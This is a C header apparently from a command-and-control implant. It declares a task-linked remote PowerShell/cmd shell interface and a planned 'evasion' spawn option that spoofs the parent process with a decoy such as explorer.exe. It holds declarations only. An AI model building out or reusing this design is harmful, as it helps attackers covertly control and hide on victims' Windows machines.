#ifndef SPHINX_SHELL_H
#define SPHINX_SHELL_H

#include <stddef.h>
#include <stdint.h>
#include "api_table.h"

void        shell_pump(void);           // drain output buffer → out_add_shell_data
int         shell_active(void);         // >0 if an active shell session exists
int         shell_has_output(void);     // unread output bytes pending
int         shell_start(const char* task_uuid, const char* which); // "powershell"|"pwsh"|"cmd"
int         shell_write(const uint8_t* data, size_t n); // stdin del pty
int         shell_resize(short cols, short rows); // ResizePseudoConsole (no-op en fallback)
int         shell_stop(void);           // cierre ordenado
const char* shell_get_task_uuid(void);  // uuid de la tarea shell activa

// future evasion options (not yet wired up)
typedef enum { SPAWN_CONPTY, SPAWN_PIPES } spawn_transport;
typedef struct {
    const char* shell;      // powershell | pwsh | cmd
    int   spoof_parent;     // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
    int   allow_conhost;    // ConPTY vs pipes
    const wchar_t* decoy;   // e.g. L"explorer.exe"
} spawn_opts;

static int shell_spawn(const spawn_opts* o); // conmuta transporte + spoof

#endif //SPHINX_SHELL_H